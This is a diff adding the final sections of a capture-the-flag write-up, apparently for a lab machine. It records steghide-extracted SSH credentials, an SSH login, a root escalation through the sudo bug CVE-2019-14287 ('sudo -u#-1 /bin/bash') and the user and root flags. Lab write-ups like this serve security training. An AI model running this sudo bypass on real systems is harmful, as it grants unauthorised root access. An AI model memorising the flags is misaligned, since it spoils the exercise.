@@ -40,4 +40,20 @@ Decryption:
 
 Steghide Extraction (cute-alien.jpg):
 - Command: steghide extract -sf cute-alien.jpg (Pass: Area51)
-- Result: SSH creds found in message.txt -> james : hack
+- Result: SSH creds found in message.txt -> james : hackerrules
+
+5. PRIVILEGE ESCALATION
+--------------------------------------------------------------------------------
+SSH Login: ssh james@10.201.82.243
+User Flag: b03d975e8c92a7c04146cfa7a5a313c7
+
+Sudo Bypass (CVE-2019-14287):
+- sudo -l shows: (ALL, !root) /bin/bash
+- Exploit: sudo -u#-1 /bin/bash
+- Check: whoami => root
+
+6. FINAL FLAGS
+--------------------------------------------------------------------------------
+[USER] b03d975e8c92a7c04146cfa7a5a313c7
+[ROOT] b53a02f55b57d4439e3341834d70c062
+================================================================================
